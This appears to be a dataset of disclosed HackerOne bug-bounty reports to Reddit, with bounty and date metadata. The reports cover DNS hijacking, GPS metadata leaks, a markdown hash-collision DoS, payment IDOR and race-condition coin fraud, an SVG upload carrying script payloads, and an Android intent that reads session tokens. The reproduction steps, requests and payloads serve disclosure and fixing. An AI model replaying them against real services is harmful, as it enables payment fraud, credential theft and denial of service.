First, DNS hijacking of domains has a higher severity because this vulnerability allows a malicious attacker to completely control all aspects of a domain opening the door to a variety of sophisticated attacks including phishing attacks, and malware distribution. Worse yet, domains owned by reputable companies typically receive greater leniency for spam emails from email providers, thus allowing a malicious attacker to more widely distribute spam than would otherwise be possible.
Second, similar to subdomain takeovers, DNS hijacking has become a more severe issue with the advent of open source tools such as Modlishka, which would allow a malicious actor to invisibly operate a high fidelity spoof of Reddit. Simply put, nothing would indicate to a user that the site was being controlled by someone else, however, a malicious attacker would be able to invisibly siphon sensitive information without any way to identify the domain as compromised. This would be a highly effective way to siphon Russian user's Reddit credentials.  An ideal option would be to run advertisements on Google Ads targeting  Russian searches for reddit. 
Third, since this is a primary domain of Reddit (reddit.ru) the value of this takeover is substantially higher for its ability to negatively impact the brand and would have proven more useful had any of the attack vectors listed above to be executed against it compared to any of the other ~1,000 domains owned by Reddit. 
Overall, this takeover presents a real and present danger to Reddit, Inc.",https://hackerone.com/reports/1226891,California,United States,San Francisco,2021,6,15,4,41
Reddit,501-1000,0.0,No value,"$5,000.00",High,7.95,Privacy Violation,GPS metadata preserved when converting HEIF to PNG,"ianonavy  submitted a report to Reddit.Dec 30th (2 years ago)Summary:
Users who upload HEIC/HEIF files (sometimes called ""Live Photos"")  to reddit.com or old.reddit.com expect their GPS metadata to be stripped before being displayed publicly. Uploaded HEIC files are converted to PNG, but GPS metadata is incorrectly preserved, in violation of user privacy. The problem is likely device- and browser-agnostic, and mostly affects Safari users on Mac since other devices and browsers either automatically convert to a different format or do not permit HEIC files to be uploaded through the usual user flow.
Impact:
All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.
Steps To Reproduce:

Take a Live photo on an iPhone 11 Pro with GPS location tagging enabled
Sync the photo to iCloud Photos
Upload HEIF/HEIC file to Reddit.com via Safari on macOS Big Sur (Example Screen_Shot_2020-12-29_at_5.00.34_PM.png (F1138749))
Submit post to any community
Visit the post and click the link to get to the https://i.redd.it/FILENAME.png file
Download the file

Supporting Material/References:
Expected behavior is no GPS metadata, but you can see that the metadata is present in these examples:

https://i.redd.it/s7vjzg05w6861.png (Safari)
https://i.redd.it/6wnf9cf637861.png (Safari)
https://i.redd.it/d1zqv32297861.png (Safari)
https://i.redd.it/8ytwrr5re7861.png (IE)

Image F1138750: Screen_Shot_2020-12-29_at_6.53.02_PM.png 292.82 KiBZoom in Zoom out Copy Download
I was also able to reproduce this flow through Internet Explorer on Windows 10 (but not Edge), which means the issue is likely device- and browser-agnostic.
However, when I tested the following flows, I found that GPS metadata was correctly removed for:

Reddit iOS app on iPhone
Safari on iPad (local testing shows iOS converts it to a JPEG before uploading)

For some tests, I wasn't able to upload HEIC photos at all:

Chrome and Firefox on Mac (HEIC not supported by image/* MIME filter on accept attribute)
Chrome, Firefox, and Edge on Windows (Windows does not recognize HEIC as an image file)
Safari on iPhone (no option to upload photos on mobile view)
Safari on Mac after having changed the file extension from .HEIC to .PNG (not actually changing the file otherwise)

It seems likely that only Safari for Mac and Internet Explorer allow HEIC files to be uploaded directly to Reddit. All other methods I've tried seem to result in normal metadata scrubbing.
I was able to find location data for at least one other user in the wild: https://i.redd.it/1hn2uafmwu661.png (post). Downloading this image, I can see their GPS location:
Image F1138751: Screen_Shot_2020-12-29_at_6.53.24_PM.png 926.50 KiBZoom in Zoom out Copy Download
I originally discovered this when spot-checking an image that I uploaded yesterday. The post can be found here, and the image was here. I have since deleted the image.
Impact
All users who have submitted HEIC files have their GPS locations exposed publicly, which can be scraped with little detection and no authorization.3 attachments:F1138749: Screen_Shot_2020-12-29_at_5.00.34_PM.pngF1138750: Screen_Shot_2020-12-29_at_6.53.02_PM.pngF1138751: Screen_Shot_2020-12-29_at_6.53.24_PM.png",https://hackerone.com/reports/1069039,California,United States,San Francisco,2020,12,30,23,35
Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Denial of Service,Hash-Collision Denial-of-Service Vulnerability in Markdown Parser,"nicolaas  submitted a report to Reddit.Sep 16th (about 1 year ago)Summary:
We have found three bugs in Reddit's markdown parser. Two of these bugs are exploitable to launch an algorithmic complexity denial-of-service (DoS) attack. In this report we explain the bugs and exploits. We also show, in a non-disruptive way, that it appears to exist in the current version of Reddit.
Context:
Reddit uses a markdown parser to convert markdown text into HTML text. Among the features that markdown text provides, is the ability to define and use named references. In markdown a reference is defined with the following syntax:
[reference_name]: https://www.example.com
A reference can be used with the following syntax:
[reference_name]
The resulting HTML text, will contain a link to https://www.example.com with the text reference_name:
<a href=""https://www.example.com/"">reference_name</a>
In the backend, this feature is implemented with a hash table data structure that maps the reference name (the key) to the associated URL (the value). When a reference is defined, a hash function is used to convert the reference name into an integer (the hash value), which is mapped to an index in an array, by taking the modulus with the array length. The reference is inserted in the array at this index (code). As there may be references with different names but identical hash values (known as collisions) a linked list is kept at each index in the array. Each collision is inserted at the start of the linked list at the index it maps to.
When a reference is used, the hash value and array index are calculated again. Then, the linked list is iterated until a reference with an identical hash value is found (code).
(Note: This behavior is faulty, see Bug 3).
Bugs:
Bug 1: The hash table uses a weak hash function
The hash function for the reference hash table is implemented in a function named hash_link_ref. This is a case-insensitive version of the SDBM hash function. This is a weak hash function, meaning that an attacker can reliably generate a large number of collisions for it. This makes the hash table vulnerable to a hash-collision DoS attack, a type of algorithmic complexity attack. In this attack, an attacker inserts a large number of collisions into the hash table. All these references will be put into the same linked list, increasing its length. Then, when a reference is used, a very large linked list needs to be iterated to find the correct entry. As a result, the time to retrieve a reference increases linearly with the number of colliding entries (O(N), where N is the number of colliding entries). This is considered an algorithmic complexity vulnerability, as the expected behavior of a hash table is to have constant time retrieval and insertion (O(1), i.e. the retrieval and insertion time are unaffected by the number of entries in the table). These vulnerabilities can be exploited in DoS attacks.
We show a proof-of-concept exploit for this vulnerability in the Proof-of-Concepts section.
Bug 2: The hash table allows duplicate entries
Typically, a hash table only allows unique keys. While allowing duplicate keys improves the insertion time (to O(1)) (code), it leaves the hash table vulnerable to a different algorithmic complexity attack. This attack is similar to the attack on Bug 1, but is simpler to execute, because it does not require many colliding entries. Instead, an attacker can create a long linked list with duplicate entries and trigger long retrieval time by using the reference associated with the last entry in the linked list. (This will be the first defined reference, as each definition is inserted at the start of the linked list)
We show a proof-of-concept exploit for this vulnerability in the Proof-of-Concepts section.
Bug 3: The hash table determines key equality on hash value alone
In the hash table implementation, when a reference name is used, an entry in the hash table is retrieved by searching for a reference with the same hash value (code). This behavior is incorrect. Since there are more possible distinct reference names than hash values, there are necessarily different reference names with the same hash value (by the pigeonhole principle). This means, an incorrect reference may be retrieved for a reference name. For example, with respect to the SDBM hash function, the input strings 37qpypz and uvhisfu collide, as they both produce the hash value 7150400. Therefore, defining and using two references with these names:
Code 97 BytesWrap lines Copy Download1Link 1: [37qpypz]
2Link 2: [uvhisfu]
3[37qpypz]: http://www.url1.com
4[uvhisfu]: http://www.url2.com
Will result in the second URL being retrieved for both references, which leads to the HTML text:
Code 103 BytesWrap lines Copy Download1Link 1: <a href=""https://www.url2.com/"">37qpypz</a>
2Link 2: <a href=""https://www.url2.com/"">uvhisfu</a>
This bug cannot be exploited to perform malicious actions (as far as we know), but it is useful to show that the current version of Reddit is still vulnerable to attacks on Bugs 1 and 2.
Proof-of-Concepts:
To illustrate the vulnerabilities caused by Bugs 1 and 2, respectively, we will measure the time it takes for the markdown parser (running locally) to parse both random and malicious reference names in markdown text. The markdown text will be formatted as follows:
Code 67 BytesWrap lines Copy Download1[s1]: /url
2[s1]
3[s2]: /url
4[s1]
5[s3]: /url
6[s1]
7...
8[sN]: /url
9[s1]
Each string si is a reference name generated either randomly or in a specific way to exploit either Bug 1 or 2. We will measure the parsing time while increasing N to show that it grows faster for the malicious input than for the random input. The reason for this is:
Each pair
Code 15 BytesWrap lines Copy Download1[si]: /url
2[s1]
contains both a reference definition and a use. Each definition will insert a new entry into the hash table and the use will retrieve the first defined reference from the table. For malicious input, every definition will insert a reference at the start of the same linked list as the first defined reference. This means, every time we use the first defined reference after a new definition, a longer linked list will need to be iterated to retrieve it.
Conversely, for random reference names, each definition will insert the reference into a random linked list in the hash table. If the randomly named reference is not inserted into the same linked list as the first defined reference, the time to retrieve the latter will be unaffected. Therefore, we expect to observe a much faster growth in parsing time for malicious input than for random input. Note, we will still observe an increase in retrieval time for randomly named references, due to randomly occurring collisions. We perform these experiments and plot the input size (x-axis) against the parsing time (y-axis). We show the graph below, which illustrates the expected behavior.
Image F1450715: snudown_poc_plot.jpg 39.16 KiBZoom in Zoom out Copy Download
Next, we explain how we generate malicious input for both attacks on Bug 1 and Bug 2.
That is, how we generate s1, s2,  ... , sN.
Bug 1:
In the typical hash-collision DoS attack, one would simply generate a large number of collisions for the hash function. However, due to Bug 3, this will not work in this case, since the first item in the linked list will be returned (in time O(1)) as it has the same hash value.
Therefore, instead, we find many non-colliding strings, s1, s2, ..., sN such that:
hash(si) != hash(sj) when i != j, but (hash(si) % T) == (hash(sj) % T) for all i and j,
where T is the hash table size. In other words, each string has a unique hash value, but they are all still inserted into the same linked list, because they map to the same table index after taking the modulus with the table size.
Bug 2:
Generating malicious input to exploit Bug 2 is significantly easier. We only find two strings s’ and s’’ such that
hash(s’) != hash(s’’) but (hash(s’) % T) == (hash(s’’) % T)
Then, let s1 = s’ and s2 = s’’, s3 = s’’, ..., sN = s’’. Since the hash table does not prevent us from entering string s’’ multiple times, we can increase the linked list length by reusing the same string.
Steps to Reproduce:
Since DoS attacks are out of scope for Reddit's bug bounty program, we need a non-disruptive way to show that the bugs exist in the current version of Reddit. To this end, we use Bug 3. Since the hash table considers reference names with the same hash value to be equal, the first entry in the linked list with the correct hash value will be returned. We can confirm that SDBM hash is used by the current version, by using a small number of colliding reference names, each with a unique URL, and observing the generated HTML text. If SDBM hash is indeed used, the use of any of these references will incorrectly yield the final URL (as this is first in the linked list).
We show the setup and outcome of this experiment. In the first image, we show the markdown text we use in a private message. Note that each of the reference names point to a different URL. Each of the reference names we use collide with respect to the SDBM hash function.
Image F1450704: snudown_bug3_msg_markdown.png 146.08 KiBZoom in Zoom out Copy Download
In the second image, we show the HTML text of the received private message, created from the markdown text. It is clear that the same URL (https://www.example.com/10) was retrieved, regardless of which reference name was requested. This is the incorrect behavior we expect if SDBM hash is used, which means Bug 1 exists in the current version of Reddit.
Image F1450705: snudown_bug3_msg_html.png 118.37 KiBZoom in Zoom out Copy Download
Suggested Fixes:
We have implemented the fixes suggested below in a private fork of a security advisory, created on our fork of Snudown. Upon request, we can add members from the Reddit team as collaborators on this security advisory, to review the suggestions.
Bug 1:
Bug 1 can be patched by replacing the SDBM hash function with a more secure, keyed hash function. A number of hash functions were created to mitigate hash-collision DoS vulnerabilities, such as HighwayHash and SipHash.
Bug 2:
Bug 2 can be patched by updating the function that inserts references into the hash table. After retrieving the correct linked list to insert the new reference into, this linked list should first be iterated to ensure the same reference does not already exist therein. Note, what the hash table considers to be the same reference should also be updated (see Suggested Fixes for Bug 3).
Bug 3:
When iterating the linked list to determine if a reference exists in it, the reference names should be compared, not only the hash values.
Attachments:
We have attached some files that allow one to build the markdown parser and test proof-of-concept exploits for Bug 1 and 2 locally.
snudown_proof_of_concept.zip (F1450818)
We also add the markdown text used in the Steps to Reproduce section:
report_input.md (F1450740)
Impact
If one, or more, attackers repeatedly force a server to parse maliciously crafted markdown text using Snudown, it may significantly impact the availability of the server and even lead to DoS.5 attachments:F1450704: snudown_bug3_msg_markdown.pngF1450705: snudown_bug3_msg_html.pngF1450715: snudown_poc_plot.jpgF1450740: report_input.mdF1450818: snudown_proof_of_concept.zip",https://hackerone.com/reports/1341957,California,United States,San Francisco,2021,9,16,19,8
Reddit,501-1000,0.0,No value,$500.00,Medium,6.1,Business Logic Errors,IDOR to pay less for coin purchases on oauth.reddit.com via /api/v2/gold/paypal/create_coin_purchase_order in `order_id` parameter,"yanouhd  submitted a report to Reddit.Jun 1st (about 1 year ago)Summary:
This vulnerability consist of modifying the PayPal transaction ID to buy a big coin pack but paying the small price for it.
Impact:
The only impact here could be that you don't earn the money you deserve, and users can offer a lot of presents to other users, breaking the magic of the reddit community.
Steps To Reproduce:
Here are the steps to reproduce : 


Click on the PayPal button to buy the smallest package (1.99$ for 500 coins at the time of writing).


By intercepting requests,  you should see a POST to https://oauth.reddit.com/api/v2/gold/paypal/create_coin_purchase_order, with this body :
coins=500&pennies=199&correlation_id=b0fc62e4-e759-4b9e-be52-da4c926560ce


The response to this request is an order_id, keep it aside. This is the order_id corresponding to a PayPal transaction with an amount of 1.99$.
{""order_id"": ""1CR56170K7852611T""}


Cancel the order, then make a new one with a bigger package (I took the 3.99$ for 1100 coins for my tests.)


Keep intercepting requests until you make it to the POST /api/v2/gold/paypal/create_coin_purchase_order one.


Now instead of forwarding the real response, change the order_id of this order to the one you kept from the 1.99$ transaction.
{""order_id"": ""1CR56170K7852611T 1F444042JJ523625W""}


You will be redirected to the PayPal transaction page with an amount of 1.99$ to pay.


Pay, and boom ! You paid 1.99$, but when you complete the order you will be given the amount of coins you ""purchased"" for the ""fake price"".


Supporting Material/References:
If you want to check my purchase history, here is the account I used for this exploit : u/YanvegHD (This is my personal account, I think I made a mistake and I should've used a test account, my apologise...)
Image F1321925: reddit1.png 26.20 KiBZoom in Zoom out Copy Download
Image F1321926: reddit2.png 78.27 KiBZoom in Zoom out Copy Download
Impact
Breaks the reddit magic about rewarding people / and people kinda stealing your money.2 attachments:F1321925: reddit1.pngF1321926: reddit2.png",https://hackerone.com/reports/1213765,California,United States,San Francisco,2021,6,1,0,8
Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Type Confusion,Image queue default key of 'None' and GraphQL unhandled type exception,"moblig  submitted a report to Reddit.Oct 1st (2 years ago)Summary:
I started testing for unrestricted file uploads and quickly discovered a way to upload a corrupted file into Reddit. I was able to bypass the MIME type of uploaded files first by uploading a normal PNG file to Reddit, intercepting the request with burp, and changing the content type from image/png to image/svg+xml, then changing the content of the PNG image to an SVG file which is intended for Stored XSS. The file successfully uploads and I receive a 201 created message back. When trying to upload there is infinite loading time and the post never actually gets posted, but I found a way to bypass this, first, you upload a completely normal PNG file and after it uploads, you do the aforementioned steps to upload an unrestricted file and you can successfully post the corrupted image. When clicking on the post the message processing image... appears and the file never loads.
Now comes the Web Cache Poisoning which ultimately leads to a complete DoS on the Reddit Home page. Once the corrupted image has been posted this will affect every user that follows the account that posted it, there is a full DoS that requires NO user interaction Something went wrong. Just don't panic appears as well as another error message saying We weren't able to load posts for this page. If the attacker wants to create more impact he can feed the URL to users who do not follow him.
Image F1010810: Screen_Shot_2020-10-01_at_11.16.11.png 433.02 KiBZoom in Zoom out Copy Download
This issue is so persistent that a user can reload the page, close it and open it again, close the browser, log out and log back in, and they still won't be able to access Reddit. This issue becomes even more persistent if a victim follows the attacker or the account posting it, the victim can try to clear the cache, clear cookies, restart the browser but the issue will still be there, there is no way of getting rid of it.
Steps To Reproduce:

As an attacker, click on 'Create Media Post' on the home screen
First choose your profile to post the corrupted image
Add a title as usual and first upload a normal png image this is a very important step
After doing so click on the + sign next to the image you just uploaded and select a normal PNG image
Intercept the request within Burp
Navigate to Content-Type: parameter and replace image/png with image/svg+xml
Replace the content of the PNG image with an SVG file code, I specifically used the following code: 

Code 4.46 KiBWrap lines Copy Download1<?xml version=""1.0"" encoding=""utf-8"" ?>
2<!DOCTYPE svg PUBLIC ""-//W3C//DTD SVG 1.1//EN"" ""http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"">
3<svg version=""1.1"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" xml:space=""preserve"">
4<rect fill=""url('http://example.com/benis.svg')"" x=""60"" y=""60"" width=""60"" height=""60""></rect>
5<rect fill=""url('https://example.com/benis.svg')"" x=""60"" y=""60"" width=""60"" height=""60""></rect>
6<rect fill=""  url(  ' https://example.com/benis.svg '  ) "" x=""60"" y=""60"" width=""60"" height=""60""></rect>
7<rect fill=""url('ftp://192.168.2.1/benis.svg')"" x=""0"" y=""0"" width=""60"" height=""60""></rect>
8<rect fill=""url('//example.com/benis.svg')"" x=""60"" y=""60"" width=""60"" height=""60""></rect>
9<rect fill=""url('/benis.svg')"" x=""60"" y=""60"" width=""60"" height=""60""></rect>
10<rect fill=""url('#benis.svg')"" x=""60"" y=""60"" width=""60"" height=""60""></rect>
11<g id=""righteye"" class=""eye"">
12    <path id=""iris-2"" data-name=""iris"" class=""cls-4"" d=""M241.4,143.6s18.5,11.9,36,7.1,29.6-15.8,27.2-24.6c-1.7-6-9.8-9.4-20.3-9.4a59.21,59.21,0,0,0-15.6,2.2,37.44,37.44,0,0,0-12.4,6.4,60.14,60.14,0,0,0-14.9,18.3"" transform=""translate(-9.7 -9.3)""/>
13    <path id=""lid"" class=""cls-11"" d=""M304.5,124.4c-1.7-6-9.8-9.4-20.3-9.4a59.21,59.21,0,0,0-15.6,2.2,37.44,37.44,0,0,0-12.4,6.4,61.21,61.21,0,0,0-14.9,18.1"" transform=""translate(-9.7 -9.3)""/>
14    <path id=""pupil-2"" data-name=""pupil"" class=""cls-12"" d=""M256.7,126.1c2.5,9.2,11,14.8,18.9,12.6s12.3-11.4,9.8-20.6a16.59,16.59,0,0,0-1.2-3.1,59.21,59.21,0,0,0-15.6,2.2,37.44,37.44,0,0,0-12.4,6.4,9.23,9.23,0,0,0,.5,2.5"" transform=""translate(-9.7 -9.3)""/>
15    <path id=""eyelash-2"" data-name=""eyelash"" class=""cls-13"" d=""M302.9,122.3c7.7,2.5,17-5,20.8-16.8M292,115.7c7.6,2.8,17.2-4.4,21.4-16M277,115.1c8.1-.3,14.3-10.5,13.9-22.8"" transform=""translate(-9.7 -9.3)""/>
16    <path id=""reflection-2"" data-name=""reflection"" class=""cls-14"" d=""M271.1,127.1c0,3.6-2.6,6.5-5.8,6.5s-5.8-2.9-5.8-6.5,2.6-6.4,5.8-6.4,5.8,2.9,5.8,6.4"" transform=""translate(-9.7 -9.3)""/>
17</g>
18    <a href=""javascript:alert(2)"">test 1</a>
19    <a xlink:href=""javascript:alert(2)"">test 2</a>
20    <a href=""#test3"">test 3</a>
21    <a xlink:href=""#test"">test 4</a>
22
23    <a href=""data:data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"">test 5</a>
24    <a xlink:href=""data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' onload='alert(88)'%3E%3C/svg%3E"">test 6</a>
25    <use xlink:href=""#a"" x=""28"" fill=""#1A374D""/>
26    <path id=""a"" d=""M14 27v-20c0-3.7-3.3-7-7-7s-7 3.3-7 7v41c0 8.2 9.2 17 20 17s20-9.2 20-20c0-13.3-13.4-21.8-26-18zm6 25c-4 0-7-3-7-7s3-7 7-7 7 3 7 7-3 7-7 7z""/>
27    <use xlink:href=""defs.svg#icon-1""/>
28    <line onload=""alert(2)"" fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""119"" y1=""84.5"" x2=""454"" y2=""84.5""/>
29<line fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""111.212"" y1=""102.852"" x2=""112.032"" y2=""476.623""/>
30<line fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""198.917"" y1=""510.229"" x2=""486.622"" y2=""501.213""/>
31<line fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""484.163"" y1=""442.196"" x2=""89.901"" y2=""60.229""/>
32<line fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""101.376"" y1=""478.262"" x2=""443.18"" y2=""75.803""/>
33<line fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""457.114"" y1=""126.623"" x2=""458.753"" y2=""363.508""/>
34<this>shouldn't be here</this>
35<script>alert(document.cookie);</script>
36<line fill=""none"" stroke=""#000000"" stroke-miterlimit=""10"" x1=""541.54"" y1=""299.573"" x2=""543.179"" y2=""536.458""/></svg>
37´´´
388. Forward the request and notice the 201 created message
399. Post the images
40
41## Supporting Material/References:
42Full Video PoC:
43{F1010849}
44In this video, I demonstrate how if a user follows or is already following the attacker account the DoS is present:
45{F1010854}
46In this video, I demonstrate how a user can try to clear cache, cookies, local storage, restart the browser and the issue will still be present:
47{F1010855}
48This is the URL where the corrupted files are posted: 
49https://www.reddit.com/user/mariomejia127/comments/j3cfbj/web_cache_poisoning/
50
51## Impact
52
53Web cache poisoning and complete denial of service, an attacker can achieve this **without user interaction** there is no way of getting rid of it, an attacker only has to deploy an attack to deny service to Reddit. In some cases I'm not able to even reach Reddit, the site won't load at all. This was tested in the following browsers: 
54Firefox
55Safari
56Opera
57For some reason, the behavior is not present in Google Chrome. But any other browser will work.4 attachments:F1010810: Screen_Shot_2020-10-01_at_11.16.11.pngF1010849: CompleteDoS_Reddit.movF1010854: DoSbyFollow.movF1010855: ClearingCache.mov",https://hackerone.com/reports/996041,California,United States,San Francisco,2020,10,1,17,50
Reddit,501-1000,0.0,No value,$100.00,Low,2.0,Violation of Secure Design Principles,No Rate Limit on redditgifts gift  when Adding Comment,"bhatiagaurav1211  submitted a report to Reddit.May 19th (2 years ago)Hi team,
I hope this report should not be closed as INFORMATIVE
Summary:
The add comment endpoint was improperly rate-limited so the potential attacker could post a large number of comments, overloading the server .
Description:
The add comment endpoint has a speed limit, but the number is set too high, so speed limiting is activated when you write more than 1000 comments per minute.
Environment:
Scope: Web Application
Attack type: OWASP API TOP10 Lack of Resources & Rate Limiting
Maximum user privileges needed to reproduce your issue: no privileges
Steps To Reproduce:
1.Go to any post.
2.Turn on Intercept and Add a Comment.
3.Send request to Intruder.
4.Set your payloads and start attack.
5.There is no rate-limit.
Note:
If there is any problem in reproduction from your side then i will provide you with video poc.
POC:
You can observe the time taken to load the post before performing the attack and after performing the attack. It will show  that the post takes alot time to load after the attack. 
Fix:
Developers alleviated the problem by setting the speed limit to low for endpoints that set the speed too high. 
Regards,
Gaurav Bhatia
Impact
No rate limit on comments can lead to slow down of server due to large number of comments in the post.",https://hackerone.com/reports/1202408,California,United States,San Francisco,2021,5,19,6,9
Reddit,501-1000,0.0,No value,$100.00,Low,3.8,Improper Access Control - Generic,Outsider can affect Upvote Percentage of private subreddit post by calling /api/vote API,"trieulieuf9  submitted a report to Reddit.Aug 11th (about 1 year ago)Summary:
Attacker that does not have access to a private subreddit, can still affect Upvote Percentage of any posts in this private subreddit. He does that by calling /api/vote API and passing post id directly.
What is Upvote Percentage?: upvote_percentage.png (F1407175)
Impact:

Attacker can affect Upvote Percentage of private subreddit posts, although he does not have access to this private subreddit posts.
Only Upvote Percentage is changed, vote number is not affected.
Limitation: Attacker needs to know post id in private subreddit to start the attack.

Steps To Reproduce:

Victim prepare a private subreddit and create a post in it [1]
Attacker intercepts a legitimate /api/vote request in Burp and send to Repeater
In Repeater, request body, change param id value to Victim's post id (assume that attacker has a way to get post id)  post_id.png (F1407184)
Change param dir value to -1 and send request. Upvote Percentage decreases from 100% => 99%
Then change param dir value to 1 and send request. Upvote Percentage decreases from 99% => 67%

[1]: If you just created a new post, please wait for half a day, until vote number is visible new_post.png (F1407178). It is fine to start the exploit right away, but the result does not update correctly until vote number is visible.
Impact

Attacker can affect Upvote Percentage of private subreddit posts, although he does not have access to this private subreddit posts.
Only Upvote Percentage is changed, vote number is not affected.
Limitation: Attacker needs to know post id in private subreddit to start the attack.
3 attachments:F1407175: upvote_percentage.pngF1407178: new_post.pngF1407184: post_id.png",https://hackerone.com/reports/1298902,California,United States,San Francisco,2021,8,11,3,43
Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Time-of-check Time-of-use (TOCTOU) Race Condition,Race condition leads to Inflation of coins when bought via Google Play Store at endpoint https://oauth.reddit.com/api/v2/gold/android/verify_purchase,"yashrs  submitted a report to Reddit.Feb 21st (3 years ago)Hi,
Summary:
When we purchase coins from Reddit's mobile app using Android, https://oauth.reddit.com/api/v2/gold/android/verify_purchase is called with parameters like transaction_id and token. There exists a race condition on this endpoint which allows an attacker to get coins many times more than it was intended to.
Steps To Reproduce:


Go to the Reddit app, click on the top right corner which has a coin icon and says Get:


Select a basic 50 coins package, and intercept this request when the purchase is completed:


Code 920 BytesWrap lines Copy Download1POST /api/v2/gold/android/verify_purchase?raw_json=1&feature=link_preview&sr_detail=true&expand_srs=true&from_detail=true&api_type=json&raw_json=1&always_show_media=1&request_timestamp=1582296187715 HTTP/1.1
2Authorization: Bearer REDACTED
3Client-Vendor-ID: REDACTED
4x-reddit-device-id: REDACTED
5User-Agent: Reddit/Version 2020.5.0/Build 255357/Android 9
6X-Dev-Ad-Id: REDACTED
7x-reddit-session: REDACTED
8x-reddit-loid: REDACTED
9x-reddaid: REDACTED
10Content-Type: application/x-www-form-urlencoded
11Content-Length: 327
12Host: oauth.reddit.com
13Connection: keep-alive
14Accept-Encoding: gzip, deflate
15
16transaction_id=GPA.3390-9967-2355-57063&token=effmpcoplmjonhljkheipnce.AO-J1OyQ3ZXb7XM7JwoJPJqpNP3LgWYqHYUUmOE7o5hCzQtf4TC8GL0i71zvRVeZKl-I5rlQCfM0ID3Z0P8CTFSUmhbdbPvQwOIN0164LBE647_lDvB9aHzk2naeC59hSFrtJJYkYj2b&package_name=com.reddit.frontpage&product_id=com.reddit.coins_1&correlation_id=394e65c9-5f9d-45e7-a9b4-498ed64251cd

We can simply repeat this request in parallel to get more coins.

I did 10 parallel requests and got 9 of them through. An actual attacker will do more requests and get more coins. Like for example, they can do 40 requests and maybe if 35 of them get through they have 35x times the coins intended.
Transaction ID for reference: GPA.3390-9967-2355-57063
Proof:
Image F724269: Screenshot_20200221-201400.jpg 142.75 KiBZoom in Zoom out Copy Download
Image F724270: Screen_Shot_2020-02-21_at_8.26.55_PM.png 17.92 KiBZoom in Zoom out Copy Download
Image F724271: Screen_Shot_2020-02-21_at_8.26.39_PM.png 263.14 KiBZoom in Zoom out Copy Download
███
Regards,
Yash
Impact
Due to a race condition on https://oauth.reddit.com/api/v2/gold/android/verify_purchase, an attacker can get more coins than what they purchased it for. This can lead to a huge business loss for Reddit, that's why I have marked this as High.3 attachments:F724269: Screenshot_20200221-201400.jpgF724270: Screen_Shot_2020-02-21_at_8.26.55_PM.pngF724271: Screen_Shot_2020-02-21_at_8.26.39_PM.png",https://hackerone.com/reports/801743,California,United States,San Francisco,2020,2,21,14,59
Reddit,501-1000,0.0,No value,$500.00,Medium,5.45,Information Disclosure,Third party app could steal access token as well as protected files using inAppBrowser,"rahulkankrale  submitted a report to Reddit.Mar 10th (2 years ago)Summary:
Reddit android app version : 2021.8.0
OS: Android 11
This app uses com.reddit.frontpage.RedditDeepLinkActivity class to route app links including deeplink and reddit.com links while this class does not check for scheme, host and it opens given url in InAppBrowser and IAB have access to apps private/protected files.
So any third party app could steal session token from ""data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml"" files as well as rest of sensitive files like DB, Cookies etc. 
Impact:
Third party app could steal access token as well as protected files using inAppBrowser
Steps To Reproduce:
To reproduce this issue I have created basic poc:

Create third-party app using snippet (Replace UserName to victims username i.e. file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.Strong-Sun628.xml) :

Code 294 BytesWrap lines Copy Download1        Intent intent = new Intent();
2        intent.setClassName(""com.reddit.frontpage"", ""com.reddit.frontpage.RedditDeepLinkActivity"");
3        intent.setData(Uri.parse(""file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.auth_active.UserName.xml""));
4        startActivity(intent);

Once open third-party app, Reddit app opens InAppBrowser with auth_active file and its data contained token.
We could also reproduce this quickly using adb:

Code 182 BytesWrap lines Copy Download1adb shell am start -n ""com.reddit.frontpage/com.reddit.frontpage.RedditDeepLinkActivity"" -d ""file:///data/data/com.reddit.frontpage/shared_prefs/com.reddit.frontpage_preferences.xml""
Supporting Material/References:
Video : Proof of concept

reddit.mp4 (F1225199)

if required I can submit complete POC to show how third-party app could save this files and send to attackers server.
Thanks
Rahul
Impact
Third party app could steal access token as well as protected files using inAppBrowser1 attachment:F1225199: reddit.mp4",https://hackerone.com/reports/1122177,California,United States,San Francisco,2021,3,10,11,15
Reddit,501-1000,0.0,No value,"$5,000.00",High,8.2,Business Logic Errors,s3 bucket takeover presented in https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/full-build-macos.sh,"bhatiagaurav1211  submitted a report to Reddit.Jul 31st (about 1 year ago)Hey team,
Summary:
 I have found that in the code of full-build-macos.sh in rpanstudio on github(https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/install-dependencies-osx.sh) contains a  s3 bucket which was unclaimed i.e (https://obs-nightly.s3-us-west-2.amazonaws.com)
Steps To Reproduce:

Create a s3 bucket with name obs-nightly and us west 2 region
Upload files  with the name same as given in the code  (e.g. cefbinary${1}_macosx64.tar.bz2)
Make the settings and change it as a static website 
You have successfully taken the s3 bucket and now when any user runs the code the url with s3 get executed and an attacker can spread dangerous malware.

POC:


Link for the s3 bucket takenover :- https://obs-nightly.s3-us-west-2.amazonaws.com/index.html
Image F1395337: reddits3poc1.JPG 28.17 KiBZoom in Zoom out Copy Download


Github link that shows the s3 bucket :- https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/install-dependencies-osx.sh
Image F1395340: reddits3poc3.JPG 153.46 KiBZoom in Zoom out Copy Download


Github link that shows the s3 bucket :- https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/full-build-macos.sh
Image F1395338: reddits3poc2.JPG 150.31 KiBZoom in Zoom out Copy Download


Remediaton
You should remove the unclaimed s3 bucket as soon as possible from both the codes as it possess a critical risk
Impact
